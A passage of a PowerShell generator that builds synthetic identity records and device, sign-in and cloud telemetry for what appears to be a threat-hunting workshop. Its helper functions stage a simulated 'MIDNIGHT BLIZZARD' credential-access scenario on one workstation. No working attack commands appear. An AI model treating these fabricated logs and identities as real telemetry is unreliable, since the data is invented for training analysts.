    $deletedTime = if ($accountStatus -eq 'Deleted') { $script:TelemetryEndTime.AddDays(-1 * (1 + ($user.Rid % 30))) } else { [datetime]'0001-01-01T00:00:00Z' }
    $department = $identityDepartments[$user.Rid % $identityDepartments.Count]
    $jobTitle = if ($user.IsServiceAccount) { 'Application Service Account' } else { $identityJobTitles[$user.Rid % $identityJobTitles.Count] }
    $employeeId = if ($user.IsServiceAccount) { '' } else { 'E{0:D6}' -f $user.Rid }
    $manager = if ($user.IsServiceAccount -or $user.IsPrivileged) { '' } else { ($users[[Math]::Min(2, $users.Count - 1)]).Upn }
    $blastRadius = if ($user.IsServiceAccount -or $user.IsPrivileged) { 'High' } elseif (($user.Rid % 11) -eq 0) { 'Medium' } else { 'Low' }
    $criticality = if ($blastRadius -eq 'High') { 2 } elseif ($blastRadius -eq 'Medium') { 1 } else { 0 }
    $riskLevel = if ($user.Name -eq 'victor.alvarez') { 'High' } elseif (($user.Rid % 37) -eq 0) { 'Medium' } else { 'None' }
    $riskStatus = if ($riskLevel -eq 'High') { 'AtRisk' } elseif ($riskLevel -eq 'Medium') { 'Remediated' } else { 'None' }
    $sourceProviderAccountId = if ($sourceProvider -eq 'ActiveDirectory') { New-StableGuid "ad-source-account|$($user.Name)" } else { $user.ObjectId }
    $accountIdPrefix = if ($sourceProvider -eq 'ActiveDirectory') { 'AdAccount' } else { 'AadAccount' }
    $accountId = '{0}_{1}_{2}' -f $accountIdPrefix, $tenantId, $sourceProviderAccountId
    $identityId = 'User_{0}_{1}' -f $tenantId, (New-StableGuid "identity-link|$($user.Name)")
    $emailAddress = $user.Upn
    $address = $identityAddresses[$user.Rid % $identityAddresses.Count]
    $phone = '+49-611-143-{0:D4}' -f ($user.Rid % 10000)
    $sourceProviderRisk = if (($user.Rid % 30) -eq 0) { 'None' } else { $null }
    $accountTags = if ($identityTags.Count -gt 0) { $identityTags } else { @() }

    Add-Record -Table 'IdentityInfo' -Time $identityTime -Values @{
        Timestamp = Format-WorkshopTime $identityTime
        ReportId = "IDINFO-$($user.Rid)"
        AccountObjectId = $user.ObjectId
        AccountUpn = $user.Upn
        OnPremSid = $user.Sid
        AccountDisplayName = $user.DisplayName
        AccountName = $user.Name
        AccountDomain = $adDomain
        CriticalityLevel = $criticality
        Type = if ($user.IsServiceAccount) { 'ServiceAccount' } else { 'User' }
        DistinguishedName = "CN=$($user.DisplayName),OU=$(if ($user.IsServiceAccount) { 'Service Accounts' } else { 'Users' }),DC=usag-cyber,DC=local"
        CloudSid = "S-1-12-1-$($user.ObjectId.Replace('-', '-'))"
        GivenName = $nameParts.GivenName
        Surname = $nameParts.Surname
        Department = $department
        JobTitle = $jobTitle
        EmailAddress = $emailAddress
        SipProxyAddress = if ($emailAddress) { "sip:$emailAddress" } else { '' }
        Address = $identityAddresses[$user.Rid % $identityAddresses.Count]
        City = 'Wiesbaden'
        Country = 'Germany'
        IsAccountEnabled = $accountStatus -eq 'Enabled'
        Manager = $manager
        Phone = '+49-611-143-{0:D4}' -f ($user.Rid % 10000)
        CreatedDateTime = Format-WorkshopTime $createdTime
        ChangeSource = 'System-UserPersistence'
        BlastRadius = $blastRadius
        CompanyName = 'USAG Cyber'
        DeletedDateTime = Format-WorkshopTime $deletedTime
        EmployeeId = $employeeId
        OtherMailAddresses = if ($emailAddress) { @($emailAddress -replace '@usag-cyber.example$', '@usag-cyber.local') } else { @() }
        RiskLevel = $riskLevel
        RiskLevelDetails = if ($riskLevel -eq 'None') { 'none' } else { 'syntheticWorkshopRisk' }
        State = 'Hesse'
        Tags = $identityTags
        AssignedRoles = $assignedRoles
        PrivilegedEntraPimRoles = $eligibleRoles
        TenantId = $tenantId
        SourceSystem = 'AzureAD'
        OnPremObjectId = New-StableGuid "onprem|$($user.Name)"
        TenantMembershipType = 'Member'
        RiskStatus = $riskStatus
        UserAccountControl = if ($accountStatus -eq 'Disabled') { 'ACCOUNTDISABLE' } else { 'NORMAL_ACCOUNT' }
        IdentityEnvironment = if ($sourceProvider -eq 'ActiveDirectory') { 'Hybrid' } else { 'CloudOnly' }
        SourceProviders = if ($sourceProvider -eq 'ActiveDirectory') { @('ActiveDirectory', 'EntraID') } else { @('EntraID') }
        GroupMembership = $identityGroups
    }

    Add-Record -Table 'IdentityAccountInfo' -Time $identityTime -Values @{
        Timestamp = Format-WorkshopTime $identityTime
        TimeGenerated = Format-WorkshopTime $identityTime
        ReportId = "IDACCT-$($user.Rid)"
        SourceProviderAccountId = $sourceProviderAccountId
        AccountId = $accountId
        IdentityId = $identityId
        IsPrimary = $true
        IdentityLinkType = 'StrongId'
        IdentityLinkReason = ''
        IdentityLinkTime = Format-WorkshopTime $createdTime.AddDays(1)
        IdentityLinkBy = ''
        DisplayName = $user.DisplayName
        AccountUpn = $user.Upn
        EmailAddress = $emailAddress
        CriticalityLevel = $criticality
        DefenderRiskLevel = if ($riskLevel -eq 'High') { 2 } elseif ($riskLevel -eq 'Medium') { 1 } else { 0 }
        DefenderRiskUpdateTime = Format-WorkshopTime $identityTime
        Type = if ($user.IsServiceAccount) { 'ServiceAccount' } else { 'User' }
        GivenName = $nameParts.GivenName
        Surname = $nameParts.Surname
        EmployeeId = $employeeId
        Department = $department
        JobTitle = $jobTitle
        Address = $address
        City = 'Wiesbaden'
        Country = 'Germany'
        Phone = $phone
        Manager = $manager
        Sid = $user.Sid
        AccountStatus = $accountStatus
        SourceProvider = $sourceProvider
        SourceProviderInstanceId = $tenantId
        SourceProviderInstanceDisplayName = if ($sourceProvider -eq 'ActiveDirectory') { 'USAG-CYBER Active Directory' } else { 'USAG Cyber Microsoft Entra ID' }
        AuthenticationMethod = if ($sourceProvider -eq 'ActiveDirectory') { 'Hybrid' } else { 'Credentials' }
        AuthenticationSourceAccountId = if ($sourceProvider -eq 'ActiveDirectory') { $sourceProviderAccountId } else { '' }
        EnrolledMfas = if ($user.IsServiceAccount) { @() } else { @('Temporary Access Pass', 'SMS') }
        LastPasswordChangeTime = Format-WorkshopTime $passwordTime
        GroupMembership = $identityGroups
        AssignedRoles = $assignedRoles
        EligibleRoles = $eligibleRoles
        TenantMembershipType = 'Member'
        CreatedDateTime = Format-WorkshopTime $createdTime
        DeletedDateTime = Format-WorkshopTime $deletedTime
        Tags = $accountTags
        SourceProviderRiskLevel = $sourceProviderRisk
        SourceProviderRiskLevelDetails = if ($sourceProviderRisk) { 'none' } else { '' }
        AdditionalFields = @{
            SourceSample = 'IdentityAccountInfo-RealTelemetry.csv'
            IdentityEnvironment = if ($sourceProvider -eq 'ActiveDirectory') { 'Hybrid' } else { 'CloudOnly' }
            AccountIdFormat = $accountIdPrefix
        }
        TenantId = $tenantId
        SourceSystem = 'AzureAD'
    }
}

function Add-ProcessEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$CommandLine, [string]$Parent, [string]$Technique, [long]$ProcessId)

    Add-Record -Table 'DeviceProcessEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ProcessCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        ProcessId = $ProcessId
        ProcessCommandLine = $CommandLine
        ProcessCreationTime = Format-WorkshopTime $Time
        ProcessIntegrityLevel = 'High'
        ProcessTokenElevation = 'TokenElevationTypeFull'
        AccountDomain = $adDomain
        AccountName = $victor.Name
        AccountSid = $victor.Sid
        AccountUpn = $victor.Upn
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $Parent
        InitiatingProcessFolderPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
        InitiatingProcessCommandLine = "$Parent -ExecutionPolicy Bypass"
        InitiatingProcessId = 3200
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddMinutes(-1)
        InitiatingProcessParentFileName = 'explorer.exe'
        ReportId = $ProcessId
        AdditionalFields = "{`"Technique`":`"$Technique`",`"ThreatActor`":`"MIDNIGHT BLIZZARD`"}"
    }
}

function Add-FileEvent {
    param([datetime]$Time, [string]$FileName, [string]$FolderPath, [string]$ProcessName, [string]$ProcessCommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceFileEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'FileCreated'
        FileName = $FileName
        FolderPath = $FolderPath
        FileSize = 5242880
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $ProcessCommandLine
        InitiatingProcessId = $ReportId
        InitiatingProcessCreationTime = Format-WorkshopTime $Time.AddSeconds(-20)
        InitiatingProcessIntegrityLevel = 'High'
        InitiatingProcessTokenElevation = 'TokenElevationTypeFull'
        ReportId = $ReportId
        AdditionalFields = '{"Collection":"CredentialArtifacts"}'
    }
}

function Add-NetworkEvent {
    param([datetime]$Time, [string]$RemoteIP, [int]$RemotePort, [string]$RemoteUrl, [string]$ProcessName, [string]$CommandLine, [long]$ReportId)

    Add-Record -Table 'DeviceNetworkEvents' -Time $Time -Values @{
        Timestamp = Format-WorkshopTime $Time
        TimeGenerated = Format-WorkshopTime $Time
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        ActionType = 'ConnectionSuccess'
        RemoteIP = $RemoteIP
        RemotePort = $RemotePort
        RemoteUrl = $RemoteUrl
        LocalIP = $win04.IP
        LocalPort = 49800 + ($ReportId % 100)
        Protocol = 'Tcp'
        LocalIPType = 'Private'
        RemoteIPType = Get-WorkshopIpAddressType -IPAddress $RemoteIP
        InitiatingProcessFileName = $ProcessName
        InitiatingProcessCommandLine = $CommandLine
        InitiatingProcessAccountDomain = $adDomain
        InitiatingProcessAccountName = $victor.Name
        InitiatingProcessAccountSid = $victor.Sid
        InitiatingProcessAccountUpn = $victor.Upn
        ReportId = $ReportId
        TenantId = $tenantId
        Type = 'DeviceNetworkEvents'
        SourceSystem = 'MDE'
        MachineGroup = 'Workstations'
        AdditionalFields = '{"Scenario":"MIDNIGHT BLIZZARD credential access"}'
    }
}

function New-NormalTelemetryValues {
    param(
        [Parameter(Mandatory)][string]$Table,
        [Parameter(Mandatory)][datetime]$Time,
        [Parameter(Mandatory)][int]$Index
    )

    $deviceNetworkProfile = $null
    if ($Table -eq 'DeviceNetworkEvents' -and $deviceNetworkEventProfiles.Count -gt 0) {
        $deviceNetworkProfile = $deviceNetworkEventProfiles[$Index % $deviceNetworkEventProfiles.Count]
    }

    $user = Get-WorkshopRandomItem $users
    $devicePool = if ($Table -eq 'DeviceRegistryEvents' -or $Table -like 'Identity*' -or $null -ne $deviceNetworkProfile) { $windowsDevices } else { $devices }
    $device = Get-WorkshopRandomItem $devicePool

    # Device-scoped telemetry uses the host's bound primary users rather than a uniform
    # draw across the directory, and is dominated by OS principals. Measured on real
    # DeviceProcessEvents: system 262, local service 71, network service 17, and a
    # single human account 65 out of 1000 rows. Identity, Entra, Graph, and cloud
    # tables keep the full synthetic population because they really are tenant wide.
    $isDeviceScopedTable = $Table -like 'Device*'
    if ($isDeviceScopedTable) {
        $boundUsers = $script:DevicePrimaryUsers[$device.ShortName]
        if ($boundUsers) {
            $user = $boundUsers[$Index % $boundUsers.Count]
        }
    }
    $isUbuntuDevice = $device.OS -eq 'Ubuntu'
    $process = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxProcessTemplates } else { $windowsProcessTemplates })
    $file = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxFileTemplates } else { $windowsFileTemplates })
    $dll = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxSharedObjectTemplates } else { $windowsDllTemplates })
    $remote = Get-WorkshopRandomItem $(if ($isUbuntuDevice) { $linuxRemoteEndpoints } else { $windowsRemoteEndpoints })
    $app = Get-WorkshopRandomItem $normalApplications
    $processPath = Resolve-WorkshopTemplatePath -Template $process -UserName $user.Name
    $filePath = Resolve-WorkshopTemplatePath -Template $file -UserName $user.Name
    # Content-addressed hashing: the same file or binary always hashes the same way,
    # widened to the distinct cardinality measured in real telemetry for this table.
    $hashes = Get-WorkshopContentHashSet -Slot 'File' -ContentKey "file|$($file.Name)" -Index $Index
    $processHashes = Get-WorkshopContentHashSet -Slot 'Binary' -ContentKey "binary|$($process.File)" -Index $Index
    $reportId = 700000 + $Index
    $timeText = Format-WorkshopTime $Time
    $accountDomain = if ($isUbuntuDevice) { $device.ShortName } else { $adDomain }
    $linuxLocalUser = if ($user.Name -like 'svc_*') { $user.Name } else { ($user.Name -replace '\.', '') }
    $humanAccountName = if ($isUbuntuDevice) { $linuxLocalUser } else { $user.Name }

    # Weighted account mix for device telemetry. Roughly matches the real observed
    # split between OS principals and the host's human user.
    $effectiveAccountName = $humanAccountName
    $initiatingAccountName = $humanAccountName
    if ($isDeviceScopedTable) {
        if ($script:Random.Next(0, 100) -lt 55) {
            $effectiveAccountName = if ($isUbuntuDevice) { 'root' } else { Get-WorkshopBuiltInPrincipal }
        }
        if ($script:Random.Next(0, 100) -lt 70) {
            $initiatingAccountName = if ($isUbuntuDevice) { 'root' } else { Get-WorkshopBuiltInPrincipal }
        }
    }

    $processCommand = if ($process.Command -like '*{0}*') { $process.Command -f $linuxLocalUser } else { $process.Command }
    $software = $null

    $values = @{
        Timestamp = $timeText
        TimeGenerated = $timeText
        CreatedDateTime = $timeText
        ActivityDateTime = $timeText
        DeviceId = $device.DeviceId
        DeviceName = $device.Name
        PublicIP = $device.PublicIP
        LocalIP = $device.IP
        AccountDomain = $accountDomain
        AccountName = $effectiveAccountName
        AccountSid = $user.Sid
        AccountUpn = $user.Upn
        AccountObjectId = $user.ObjectId
        AccountDisplayName = $user.DisplayName
        InitiatingProcessAccountDomain = $accountDomain
        InitiatingProcessAccountName = $initiatingAccountName
        InitiatingProcessAccountSid = $user.Sid
        InitiatingProcessAccountUpn = $user.Upn
        InitiatingProcessAccountObjectId = $user.ObjectId
        InitiatingProcessIntegrityLevel = 'Medium'
        InitiatingProcessTokenElevation = 'TokenElevationTypeLimited'
        InitiatingProcessFileName = $process.File
        InitiatingProcessFolderPath = $processPath
        InitiatingProcessCommandLine = $processCommand
        InitiatingProcessParentFileName = $process.Parent
        InitiatingProcessSHA1 = $processHashes.SHA1
        InitiatingProcessSHA256 = $processHashes.SHA256
        InitiatingProcessMD5 = $processHashes.MD5
        SHA1 = $hashes.SHA1
        SHA256 = $hashes.SHA256
        MD5 = $hashes.MD5
        FileName = $file.Name
        FolderPath = $filePath
        FileSize = $file.Size
        AADTenantId = $tenantId
        TenantId = $tenantId
        ReportId = $reportId
        Type = $Table
        AdditionalFields = @{ Workload = 'WorkshopNormal'; Baseline = $true; OSProfile = if ($isUbuntuDevice) { 'Ubuntu' } else { 'Windows' } }
    }

    switch ($Table) {
        'DeviceProcessEvents' {
            $values.ActionType = 'ProcessCreated'
            $values.FileName = $process.File
            $values.FolderPath = $processPath
            $values.ProcessCommandLine = $processCommand
            $values.ProcessCreationTime = $timeText
            $values.ProcessId = 2000 + ($Index % 40000)
            $values.ProcessIntegrityLevel = if ($isUbuntuDevice) { 'Unknown' } else { 'Medium' }
            $values.ProcessTokenElevation = if ($isUbuntuDevice) { 'None' } else { 'TokenElevationTypeLimited' }
        }
        'DeviceFileEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('FileCreated', 'FileModified', 'FileRenamed', 'FileDeleted')
        }
        'DeviceImageLoadEvents' {
            $values.ActionType = 'ImageLoaded'
            $values.FileName = $dll.Name
            $values.FolderPath = $dll.Path
            $values.FileSize = $dll.Size
            $dllHashes = Get-WorkshopContentHashSet -Slot 'Module' -ContentKey "module|$($dll.Name)" -Index $Index
            $values.SHA1 = $dllHashes.SHA1
            $values.SHA256 = $dllHashes.SHA256
            $values.MD5 = $dllHashes.MD5
        }
        'DeviceEvents' {
            $values.ActionType = if ($isUbuntuDevice) {
                Get-WorkshopRandomItem @('AuditdProcessExecution', 'SshSessionStarted', 'SudoCommand', 'PackageInstalled', 'ServiceStarted', 'AntivirusSignatureUpdated')
            }
            else {
                Get-WorkshopRandomItem @('ScheduledTaskCreated', 'ScheduledTaskDeleted', 'ServiceInstalled', 'AntivirusSignatureUpdated', 'PowerShellCommand', 'AppControlCodeIntegrityPolicyAudited')
            }
            $values.FileName = $process.File
            $values.FolderPath = $processPath
            $values.ProcessCommandLine = $processCommand
        }
        'DeviceNetworkEvents' {
            if ($null -ne $deviceNetworkProfile) {
                $networkProcess = Resolve-WorkshopDeviceNetworkProcessProfile -FileName $deviceNetworkProfile.InitiatingProcessFileName -UserName $user.Name
                $networkProcessHashes = Get-WorkshopContentHashSet -Slot 'Binary' -ContentKey "binary|$($networkProcess.File)" -Index $Index

                $values.ActionType = $deviceNetworkProfile.ActionType
                $values.RemoteUrl = $deviceNetworkProfile.RemoteUrl
                $values.RemoteIP = $deviceNetworkProfile.RemoteIP
                $values.RemotePort = $deviceNetworkProfile.RemotePort
                $values.Protocol = $deviceNetworkProfile.Protocol
                $values.LocalIPType = $deviceNetworkProfile.LocalIPType
                $values.RemoteIPType = $deviceNetworkProfile.RemoteIPType
                $values.LocalIP = if ($deviceNetworkProfile.LocalIPType -eq 'Loopback') { '127.0.0.1' } else { $device.IP }
                $values.InitiatingProcessFileName = $networkProcess.File
                $values.InitiatingProcessFolderPath = $networkProcess.Path
                $values.InitiatingProcessCommandLine = $networkProcess.Command
                $values.InitiatingProcessParentFileName = $networkProcess.Parent
                $values.InitiatingProcessSHA1 = $networkProcessHashes.SHA1
                $values.InitiatingProcessSHA256 = $networkProcessHashes.SHA256
                $values.InitiatingProcessMD5 = $networkProcessHashes.MD5
            }
            else {
                $values.ActionType = 'ConnectionSuccess'
                $values.RemoteUrl = $remote.Url
                $values.RemoteIP = $remote.IP
                $values.RemotePort = $remote.Port
                $values.Protocol = if ($remote.PSObject.Properties['Protocol']) { $remote.Protocol } else { 'Tcp' }
                $values.LocalIPType = Get-WorkshopIpAddressType -IPAddress $values.LocalIP
                $values.RemoteIPType = Get-WorkshopIpAddressType -IPAddress $values.RemoteIP
            }

            $values.LocalPort = 49152 + ($Index % 12000)
            $values.SourceSystem = 'MDE'
            $values.MachineGroup = if ($device.Type -eq 'DomainController') { 'Domain Controllers' } elseif ($device.Type -eq 'EntraConnect') { 'Identity Tier 0' } elseif ($isUbuntuDevice) { 'Linux Servers' } else { 'Workstations' }
        }
        'DeviceLogonEvents' {
            $values.ActionType = if (($Index % 17) -eq 0) { 'LogonFailed' } else { 'LogonSuccess' }
            $values.LogonType = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('Ssh', 'Local', 'Sudo') } else { Get-WorkshopRandomItem @('Interactive', 'Network', 'RemoteInteractive', 'CachedInteractive') }
            $values.Protocol = if ($isUbuntuDevice) { if ($values.LogonType -eq 'Ssh') { 'Ssh' } else { 'PAM' } } else { Get-WorkshopRandomItem @('Kerberos', 'NTLM', 'Negotiate') }
            $values.IsLocalAdmin = if ($isUbuntuDevice) { $values.LogonType -eq 'Sudo' -or $user.Name -like 'svc_*' } else { ($user.Name -like 'svc_*' -or $device.Type -in @('DomainController', 'EntraConnect')) }
            $values.LogonId = 800000 + $Index
            $values.RemoteDeviceName = if ($isUbuntuDevice) { 'ADMIN-JUMP01.usag-cyber.local' } else { (Get-WorkshopRandomItem $devices).Name }
            $values.RemoteIP = if ($isUbuntuDevice) { '10.42.30.10' } else { (Get-WorkshopRandomItem $devices).IP }
        }
        'DeviceRegistryEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('RegistryValueSet', 'RegistryKeyCreated', 'RegistryValueDeleted')
            $values.RegistryKey = Get-WorkshopRandomItem @('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense', 'HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Common')
            $values.RegistryValueName = Get-WorkshopRandomItem @('TelemetryLevel', 'LastSyncTime', 'UpdateChannel')
            $values.RegistryValueData = Get-WorkshopRandomItem @('Enabled', 'Current', 'MonthlyEnterprise')
            $values.RegistryValueType = 'REG_SZ'
        }
        'DeviceInfo' {
            $deviceInfoValues = New-WorkshopDeviceInfoValues -Device $device -Time $Time -Index $Index -User $user -Ambient
            foreach ($deviceInfoKey in $deviceInfoValues.Keys) {
                $values[$deviceInfoKey] = $deviceInfoValues[$deviceInfoKey]
            }
        }
        'DeviceNetworkInfo' {
            $values.NetworkAdapterName = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('ens160', 'eth0') } else { 'Ethernet0' }
            $values.ConnectedNetworks = if ($isUbuntuDevice) { @(@{ Name = 'CorpLinux'; Category = 'Private' }) } else { @(@{ Name = 'CorpNet'; Category = 'DomainAuthenticated' }) }
            $values.IPAddresses = @($device.IP)
            $values.MacAddress = if ($isUbuntuDevice) { ('00:15:5d:{0:x2}:{1:x2}:{2:x2}' -f ($Index % 255), (($Index + 42) % 255), (($Index + 99) % 255)) } else { ('00-15-5D-{0:X2}-{1:X2}-{2:X2}' -f ($Index % 255), (($Index + 42) % 255), (($Index + 99) % 255)) }
        }
        'AADManagedIdentitySignInLogs' {
            $managedResource = $managedIdentityResourceCatalog[$Index % $managedIdentityResourceCatalog.Count]
            $targetResource = $servicePrincipalResourceCatalog[$Index % $servicePrincipalResourceCatalog.Count]
            $isFailure = ($Index % 97) -eq 0
            $managedIdentityName = '{0}-mi' -f $managedResource.Name
            $managedIdentityResourceId = '/subscriptions/{0}/resourceGroups/{1}/providers/{2}/{3}' -f $subscriptionId, $managedResource.ResourceGroup, $managedResource.Provider, $managedResource.Name
            $servicePrincipalSeed = "$Table|managed-identity|$($managedResource.Name)"
            $servicePrincipalId = New-StableGuid "$servicePrincipalSeed|servicePrincipal"
            $appIdValue = New-StableGuid "$servicePrincipalSeed|appId"
            $correlationId = New-StableGuid "$Table|correlation|$Index"
            $locationDetails = @{
                countryOrRegion = 'DE'
                state = 'Hesse'
                city = 'Wiesbaden'
                geoCoordinates = @{ latitude = 50.0782; longitude = 8.2398 }
            }
            $managedIdentityDetails = @{
                azureResourceId = $managedIdentityResourceId
                clientId = $appIdValue
                identityType = $managedResource.IdentityType
                name = $managedIdentityName
                principalId = $servicePrincipalId
                resourceName = $managedResource.Name
                resourceProvider = $managedResource.Provider
            }
            $authenticationDetails = @(
                @{
                    key = 'ManagedIdentityTokenSource'
                    value = if ($managedResource.Provider -eq 'Microsoft.Compute/virtualMachines') { 'Azure Instance Metadata Service' } else { 'Azure Resource Managed Identity Endpoint' }
                }
            )

            $values.AADTenantId = $tenantId
            $values.AppId = $appIdValue
            $values.AppOwnerTenantId = $tenantId
            $values.AuthenticationProcessingDetails = ConvertTo-Json -InputObject $authenticationDetails -Compress -Depth 8
            $values.Category = 'ManagedIdentitySignInLogs'
            $values.ClientCredentialType = 'ManagedIdentity'
            $values.ConditionalAccessAudiences = '[]'
            $values.ConditionalAccessPolicies = '[]'
            $values.ConditionalAccessStatus = 'notApplied'
            $values.CorrelationId = $correlationId
            $values.CreatedDateTime = $timeText
            $values.DurationMs = 20 + ($Index % 900)
            $values.Id = New-StableGuid "$Table|signin|$Index"
            $values.Identity = $managedIdentityName
            $values.IPAddress = $managedResource.PrivateIp
            $values.Level = if ($isFailure) { 'Warning' } else { 'Informational' }
            $values.Location = $managedResource.Region
            $values.LocationDetails = ConvertTo-Json -InputObject $locationDetails -Compress -Depth 8
            $values.ManagedServiceIdentity = ConvertTo-Json -InputObject $managedIdentityDetails -Compress -Depth 8
            $values.NetworkLocationDetails = '[]'
            $values.OperationName = 'Sign-in activity'
            $values.OperationVersion = '1.0'
            $values.ResourceDisplayName = $targetResource.Name
            $values.ResourceGroup = $managedResource.ResourceGroup
            $values.ResourceIdentity = $targetResource.Id
            $values.ResourceOwnerTenantId = $tenantId
            $values.ResourceServicePrincipalId = New-StableGuid "resource-service-principal|$($targetResource.Id)"
            $values.ResultDescription = if ($isFailure) { 'Managed identity token request failed synthetic policy evaluation' } else { 'Success' }
            $values.ResultSignature = if ($isFailure) { '53003' } else { '0' }
            $values.ResultType = if ($isFailure) { 'Failure' } else { 'Success' }
            $values.ServicePrincipalId = $servicePrincipalId
            $values.ServicePrincipalName = $managedIdentityName
            $values.SessionId = New-StableGuid "$Table|session|$Index"
            $values.SourceAppClientId = $appIdValue
            $values.SourceSystem = 'Azure'
            $values.TenantId = $tenantId
            $values.TimeGenerated = $timeText
            $values.Type = $Table
            $values.UniqueTokenIdentifier = New-StableGuid "$Table|token|$Index"
            $values.UserAgent = $managedResource.UserAgent
        }
        { $_ -in @('SigninLogs', 'AADNonInteractiveUserSignInLogs', 'AADServicePrincipalSignInLogs', 'EntraIdSignInEvents', 'AADSignInEventsBeta', 'AADSpnSignInEventsBeta', 'EntraIdSpnSignInEvents') } {
            $values.Application = $app.Name
            $values.ApplicationId = $app.Id
            $values.AppDisplayName = $app.Name
            $values.AppId = $app.Id
            $values.ResourceDisplayName = $app.Resource
            $values.UserPrincipalName = $user.Upn
            $values.UserDisplayName = $user.DisplayName
            $values.UserId = $user.ObjectId
            $values.Identity = $user.DisplayName
            $values.IPAddress = Get-WorkshopRandomItem @('198.51.100.50', '198.51.100.60', '203.0.113.25', '192.0.2.44')
            $values.Country = 'DE'
            $values.State = 'Hesse'
            $values.City = 'Wiesbaden'
            $values.Location = 'DE'
            $values.ResultType = '0'
            $values.ResultDescription = 'Success'
            $values.ErrorCode = 0
            $values.IsInteractive = $Table -notlike '*NonInteractive*'
            $values.IsRisky = $false
            $values.RiskLevel = 'none'
            $values.RiskLevelDuringSignIn = 'none'
            $values.RiskState = 'none'
            $values.ConditionalAccessStatus = 'success'
            $values.AuthenticationRequirement = if (($Index % 4) -eq 0) { 'multiFactorAuthentication' } else { 'singleFactorAuthentication' }
            $values.AuthenticationMethodsUsed = if (($Index % 4) -eq 0) { 'Password,Authenticator App' } else { 'Password' }
            $values.ClientAppUsed = Get-WorkshopRandomItem @('Browser', 'Mobile Apps and Desktop clients', 'Exchange ActiveSync')
            $values.UserAgent = if ($isUbuntuDevice) { Get-WorkshopRandomItem @('Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36', 'curl/8.5.0', 'Microsoft-MDATP/101.25042.0000') } else { Get-WorkshopRandomItem @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Microsoft Office/16.0', 'Teams/24215.1007.3082.1590') }
            $values.CorrelationId = New-StableGuid "$Table|signin-correlation|$Index"
            $values.Id = New-StableGuid "$Table|signin|$Index"
            $values.Status = @{ errorCode = 0; failureReason = 'Other'; additionalDetails = 'MFA requirement satisfied' }
            $values.DeviceDetail = @{ operatingSystem = if ($device.OS -eq 'Ubuntu') { 'Linux' } else { 'Windows' }; browser = 'Edge'; isCompliant = $true; trustType = 'Hybrid Azure AD joined' }

            if ($Table -in @('AADSpnSignInEventsBeta', 'EntraIdSpnSignInEvents')) {
                $spn = $servicePrincipalSignInCatalog[$Index % $servicePrincipalSignInCatalog.Count]
                $resource = $servicePrincipalResourceCatalog[$Index % $servicePrincipalResourceCatalog.Count]
                $hasNetworkContext = ($Index % 1000) -lt 137
                $hasUserAgent = ($Index % 1000) -lt 248
                $appIdVariant = if (($Index % 13) -eq 0) { 2 } elseif (($Index % 5) -eq 0) { 1 } else { 0 }
                $eventId = New-StableGuid "$Table|spn-signin|$Index"
                $location = if ($hasNetworkContext) { $servicePrincipalLocationCatalog[$Index % $servicePrincipalLocationCatalog.Count] } else { $null }

                $values.Application = $spn.Name
                $values.ApplicationId = New-StableGuid "$($spn.Seed)|appId|$appIdVariant"
                $values.AppDisplayName = $spn.Name
                $values.AppId = $values.ApplicationId
                $values.IsManagedIdentity = -not $hasNetworkContext
                $values.IsConfidentialClient = ($Index % 1000) -lt 941
                $values.ErrorCode = 0
                $values.CorrelationId = $eventId
                $values.RequestId = $eventId
                $values.UniqueTokenId = $eventId
                $values.ServicePrincipalName = $spn.Name
                $values.ServicePrincipalId = if ($hasNetworkContext) { New-StableGuid "$($spn.Seed)|servicePrincipal|$($Index % 6)" } else { '' }
                $values.ResourceDisplayName = $resource.Name
                $values.ResourceId = $resource.Id
                $values.ResourceTenantId = $tenantId
                $values.IPAddress = if ($hasNetworkContext) { '198.51.100.{0}' -f (10 + ($Index % 55)) } else { '' }
                $values.Country = if ($location) { $location.Country } else { '' }
                $values.State = if ($location) { $location.State } else { '' }
                $values.City = if ($location) { $location.City } else { '' }
                $values.Latitude = if ($location) { $location.Latitude } else { '' }
                $values.Longitude = if ($location) { $location.Longitude } else { '' }
                $values.ReportId = "SPN-$Index"
                $values.GatewayJA4 = $servicePrincipalGatewayJa4Catalog[$Index % $servicePrincipalGatewayJa4Catalog.Count]
                $values.SessionId = if ($hasNetworkContext) { New-StableGuid "$Table|spn-session|$Index" } else { '' }
                $values.UserAgent = if ($hasUserAgent) {
                    if ($values.IsManagedIdentity) {
                        $servicePrincipalUserAgents[0]
                    }
                    else {
                        $servicePrincipalUserAgents[1 + ($Index % ($servicePrincipalUserAgents.Count - 1))]
                    }
                }
                else {
                    ''
                }
                $values.TenantId = ''
                $values.Type = $Table
                $values.SourceSystem = ''
            }
        }
        'CloudAppEvents' {
            $values.ActionType = Get-WorkshopRandomItem @('FileDownloaded', 'FileUploaded', 'UserLoggedIn', 'MailItemsAccessed', 'OAuthAppConsent')
